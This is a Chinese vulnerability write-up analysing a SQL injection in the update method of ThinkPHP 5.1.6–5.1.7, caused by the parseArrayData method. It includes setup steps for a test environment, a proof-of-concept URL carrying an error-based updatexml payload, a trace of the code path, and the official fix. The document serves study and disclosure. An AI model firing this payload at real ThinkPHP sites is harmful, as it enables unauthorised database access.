<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>5.1.6 &lt;= Thinkphp &lt;= 5.1.7（非最新的 5.1.8 版本也可利用）</h1><h2>一、漏洞简介</h2><p>本篇文章，将分析 <strong>ThinkPHP</strong> 中存在的 <strong>SQL注入</strong> 漏洞（ <strong>update</strong> 方法注入）。本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseArrayData</strong> 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生</p><h2>二、漏洞影响</h2><p>5.1.6&lt;=ThinkPHP&lt;=5.1.7 (非最新的 <strong>5.1.8</strong> 版本也可利用)。</p><h2>三、复现过程</h2><h3>漏洞环境</h3><p>通过以下命令获取测试环境代码：</p><p>composer create-project --prefer-dist topthink/think tpdemo</p><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><p>"require": {<br />    "php": "&gt;=5.6.0",<br />    "topthink/framework": "5.1.7"<br />}</p><p>然后执行 composer update ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p><p>&lt;?php<br />namespace app\index\controller;<br /><br />class Index<br />{<br />    public function index()<br />    {<br />        $username = request()-&gt;get('username/a');<br />        db('users')-&gt;where(['id' =&gt; 1])-&gt;update(['username' =&gt; $username]);<br />        return 'Update success';<br />    }<br />}</p><p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。创建数据库信息如下：</p><p>create database tpdemo;<br />use tpdemo;<br />create table users(<br />    id int primary key auto_increment,<br />    username varchar(50) not null<br />);<br />insert into users(id,username) values(1,'mochazz');</p><h3>poc</h3><p>http://0-sec.org:8000/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0</p><p>访问链接，即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p><p>1.png</p><h3>漏洞分析</h3><p>2.png</p><p>首先在官方发布的 <strong>5.1.9</strong> 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 <strong>commit</strong> 记录，发现其删除了 <strong>parseArrayData</strong> 方法，这处 <strong>case</strong> 语句之前出现过 <strong>insert</strong> 注入，所以比较可疑。</p><p>3.png</p><p>接着我们直接跟着上面的攻击 <strong>payload</strong> 来看看漏洞原理。首先， <strong>payload</strong> 数据经过 <strong>ThinkPHP</strong> 内置方法的过滤后（不影响我们的 <strong>payload</strong> ），直接进入了 <strong>Query</strong> 类的 <strong>update</strong> 方法，该方法调用了 <strong>Connection</strong> 类的 <strong>update</strong> 方法，该方法又调用了 <strong>$this-&gt;builder</strong> 的 <strong>insert</strong> 方法，这里的 <strong>$this-&gt;builder</strong> 为 <strong>\think\db\builder\Mysql</strong> 类，该类继承于 <strong>Builder</strong> 类，代码如下：</p><p>4.png</p><p>在 <strong>Builder</strong> 类的 <strong>update</strong> 方法中，调用了 <strong>parseData</strong> 方法。这个方法中的 <strong>case</strong> 语句之前存在 <strong>SQL注入漏洞</strong> ，现已修复，然而却多了 <strong>default</strong> 代码段，而这段代码也是在新版本中被删除的。</p><p>5.png</p><p>我们跟进到 <strong>parseArrayData</strong> 方法，发现其中又将可控变量进行拼接，其变量来源均来自用户输入。之后的过程就和之前的 <strong>insert</strong> 注入一样，用 <strong>str_replace</strong> 将变量填充到 <strong>SQL</strong> 语句中，最终执行，导致 <strong>SQL注入漏洞</strong> 。</p><p>6.png</p><p>上面 <strong>第15行</strong> 的 <strong>$result</strong> 相当于 <strong>$a('$b($c)')</strong> 其中 <strong>$a、$b、$c</strong> 均可控。最后形成的 <strong>SQL</strong> 语句如下：</p><p>UPDATE `users`  SET `username` = $a('$b($c)')  WHERE  `id` = 1;</p><p>接着我们想办法闭合即可。我们令 <strong>$a = updatexml(1,concat(0x7,user(),0x7e),1)^</strong> 、 <strong>$b = 0</strong> 、 <strong>$c = 1</strong> ，即：</p><p>UPDATE `users` SET `username` = updatexml(1,concat(0x7,user(),0x7e),1)^('0(1)') WHERE `id` = 1</p><h3>漏洞修复</h3><p>官方修复方法比较暴力，直接将 <strong>parseArrayData</strong> 方法删除了。</p><p>7.png</p><h3>攻击总结</h3><p>最后，再通过一张攻击流程图来回顾整个攻击过程。</p><p>8.png</p><h2>参考链接</h2><p>https://github.com/Mochazz/ThinkPHP-Vuln</p></body></html>